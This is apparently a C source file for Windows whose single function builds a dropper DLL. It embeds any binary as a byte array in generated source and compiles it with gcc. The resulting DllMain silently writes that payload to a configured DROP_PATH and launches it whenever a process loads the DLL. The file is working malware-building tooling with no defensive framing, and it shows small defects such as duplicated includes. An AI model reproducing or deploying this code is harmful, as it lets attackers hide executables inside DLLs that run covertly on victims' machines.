#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "config.h"

int build_launcher_dll(const char *binary_path, const char *dll_out_path)
{
    HANDLE input_handle = INVALID_HANDLE_VALUE;
    LARGE_INTEGER file_size;
    unsigned char *binary_data = NULL;
    char source_path[MAX_PATH];
    char output_temp_path[MAX_PATH];
    char temp_dir[MAX_PATH];
    DWORD temp_dir_length;
    FILE *source_file = NULL;
    char *command_line = NULL;
    STARTUPINFOA startup_info;
    PROCESS_INFORMATION process_info;
    DWORD exit_code = 1;
    int result = -1;
    SIZE_T binary_length;
    SIZE_T offset;
    size_t source_length;
    size_t output_length;
    size_t command_capacity;
    char *command_cursor;
    size_t i;

    if (binary_path == NULL || dll_out_path == NULL ||
        binary_path[0] == '\0' || dll_out_path[0] == '\0') {
        return -1;
    }

    input_handle = CreateFileA(binary_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (input_handle == INVALID_HANDLE_VALUE) {
        goto cleanup;
    }

    if (!GetFileSizeEx(input_handle, &file_size) || file_size.QuadPart <= 0 ||
        (unsigned long long)file_size.QuadPart > (unsigned long long)SIZE_MAX) {
        goto cleanup;
    }

    binary_length = (SIZE_T)file_size.QuadPart;
    binary_data = (unsigned char *)malloc(binary_length);
    if (binary_data == NULL) {
        goto cleanup;
    }

    offset = 0;
    while (offset < binary_length) {
        DWORD bytes_to_read = (binary_length - offset > MAXDWORD)
                                  ? MAXDWORD
                                  : (DWORD)(binary_length - offset);
        DWORD bytes_read = 0;
        if (!ReadFile(input_handle, binary_data + offset, bytes_to_read,
                      &bytes_read, NULL) || bytes_read == 0) {
            goto cleanup;
        }
        offset += bytes_read;
    }

    if (!CloseHandle(input_handle)) {
        input_handle = INVALID_HANDLE_VALUE;
        goto cleanup;
    }
    input_handle = INVALID_HANDLE_VALUE;

    temp_dir_length = GetTempPathA(MAX_PATH, temp_dir);
    if (temp_dir_length == 0 || temp_dir_length >= MAX_PATH ||
        GetTempFileNameA(temp_dir, "bld", 0, source_path) == 0 ||
        GetTempFileNameA(temp_dir, "dll", 0, output_temp_path) == 0) {
        goto cleanup;
    }

    source_file = fopen(source_path, "wb");
    if (source_file == NULL) {
        goto cleanup;
    }

    if (fputs("#include <windows.h>\n"
              "#include <stddef.h>\n"
              "#include \"config.h\"\n"
              "static const unsigned char launcher_payload[] = {\n",
              source_file) == EOF) {
        goto cleanup;
    }

    for (i = 0; i < (size_t)binary_length; ++i) {
        if (fprintf(source_file, "0x%02X,", (unsigned int)binary_data[i]) < 0) {
            goto cleanup;
        }
        if ((i & 15U) == 15U && fputc('\n', source_file) == EOF) {
            goto cleanup;
        }
    }

    if (fputs("\n};\n"
              "BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved)\n"
              "{\n"
              "    (void)instance;\n"
              "    (void)reserved;\n"
              "    if (reason == DLL_PROCESS_ATTACH) {\n"
              "        HANDLE output = CreateFileA(DROP_PATH, GENERIC_WRITE, 0, NULL,\n"
              "                                   CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n"
              "        if (output != INVALID_HANDLE_VALUE) {\n"
              "            SIZE_T position = 0;\n"
              "            while (position < sizeof(launcher_payload)) {\n"
              "                SIZE_T remaining = sizeof(launcher_payload) - position;\n"
              "                DWORD amount = remaining > MAXDWORD ? MAXDWORD : (DWORD)remaining;\n"
              "                DWORD written = 0;\n"
              "                if (!WriteFile(output, launcher_payload + position, amount,\n"
              "                               &written, NULL) || written == 0) {\n"
              "                    break;\n"
              "                }\n"
              "                position += written;\n"
              "            }\n"
              "            CloseHandle(output);\n"
              "        }\n"
              "        {\n"
              "            STARTUPINFOA startup;\n"
              "            PROCESS_INFORMATION process;\n"
              "            char command_line[] = DROP_PATH;\n"
              "            ZeroMemory(&startup, sizeof(startup));\n"
              "            ZeroMemory(&process, sizeof(process));\n"
              "            startup.cb = sizeof(startup);\n"
              "            if (CreateProcessA(DROP_PATH, command_line, NULL, NULL, FALSE,\n"
              "                               0, NULL, NULL, &startup, &process)) {\n"
              "                CloseHandle(process.hThread);\n"
              "                CloseHandle(process.hProcess);\n"
              "            }\n"
              "        }\n"
              "    }\n"
              "    return TRUE;\n"
              "}\n",
              source_file) == EOF || ferror(source_file)) {
        goto cleanup;
    }

    if (fclose(source_file) != 0) {
        source_file = NULL;
        goto cleanup;
    }
    source_file = NULL;

    source_length = strlen(source_path);
    output_length = strlen(output_temp_path);
    if (source_length > (SIZE_MAX - 128U) / 2U ||
        output_length > (SIZE_MAX - 128U - source_length * 2U) / 2U) {
        goto cleanup;
    }
    command_capacity = 128U + 2U * (source_length + output_length);
    command_line = (char *)malloc(command_capacity);
    if (command_line == NULL) {
        goto cleanup;
    }

    command_cursor = command_line;
    memcpy(command_cursor, "gcc -shared -x c -I. -o ", 24);
    command_cursor += 24;

    *command_cursor++ = '"';
    i = 0;
    while (i < output_length) {
        if (output_temp_path[i] == '\\') {
            size_t slashes = 0;
            while (i < output_length && output_temp_path[i] == '\\') {
                ++slashes;
                ++i;
            }
            if (i == output_length) {
                size_t count = slashes * 2U;
                while (count-- != 0) {
                    *command_cursor++ = '\\';
                }
            } else if (output_temp_path[i] == '"') {
                size_t count = slashes * 2U + 1U;
                while (count-- != 0) {
                    *command_cursor++ = '\\';
                }
                *command_cursor++ = output_temp_path[i++];
            } else {
                while (slashes-- != 0) {
                    *command_cursor++ = '\\';
                }
                *command_cursor++ = output_temp_path[i++];
            }
        } else if (output_temp_path[i] == '"') {
            *command_cursor++ = '\\';
            *command_cursor++ = output_temp_path[i++];
        } else {
            *command_cursor++ = output_temp_path[i++];
        }
    }
    *command_cursor++ = '"';
    *command_cursor++ = ' ';

    *command_cursor++ = '"';
    i = 0;
    while (i < source_length) {
        if (source_path[i] == '\\') {
            size_t slashes = 0;
            while (i < source_length && source_path[i] == '\\') {
                ++slashes;
                ++i;
            }
            if (i == source_length) {
                size_t count = slashes * 2U;
                while (count-- != 0) {
                    *command_cursor++ = '\\';
                }
            } else if (source_path[i] == '"') {
                size_t count = slashes * 2U + 1U;
                while (count-- != 0) {
                    *command_cursor++ = '\\';
                }
                *command_cursor++ = source_path[i++];
            } else {
                while (slashes-- != 0) {
                    *command_cursor++ = '\\';
                }
                *command_cursor++ = source_path[i++];
            }
        } else if (source_path[i] == '"') {
            *command_cursor++ = '\\';
            *command_cursor++ = source_path[i++];
        } else {
            *command_cursor++ = source_path[i++];
        }
    }
    *command_cursor++ = '"';
    *command_cursor = '\0';

    ZeroMemory(&startup_info, sizeof(startup_info));
    ZeroMemory(&process_info, sizeof(process_info));
    startup_info.cb = sizeof(startup_info);

    if (!CreateProcessA(NULL, command_line, NULL, NULL, FALSE, 0, NULL, NULL,
                        &startup_info, &process_info)) {
        goto cleanup;
    }

    CloseHandle(process_info.hThread);
    if (WaitForSingleObject(process_info.hProcess, INFINITE) != WAIT_OBJECT_0 ||
        !GetExitCodeProcess(process_info.hProcess, &exit_code)) {
        TerminateProcess(process_info.hProcess, 1);
        WaitForSingleObject(process_info.hProcess, INFINITE);
        CloseHandle(process_info.hProcess);
        goto cleanup;
    }
    CloseHandle(process_info.hProcess);
    if (exit_code != 0) {
        goto cleanup;
    }

    if (!MoveFileExA(output_temp_path, dll_out_path,
                     MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) {
        goto cleanup;
    }

    result = 0;

cleanup:
    if (source_file != NULL) {
        fclose(source_file);
    }
    if (input_handle != INVALID_HANDLE_VALUE) {
        CloseHandle(input_handle);
    }
    if (source_path[0] != '\0') {
        DeleteFileA(source_path);
    }
    if (output_temp_path[0] != '\0') {
        DeleteFileA(output_temp_path);
    }
    free(command_line);
    free(binary_data);
    return result;
}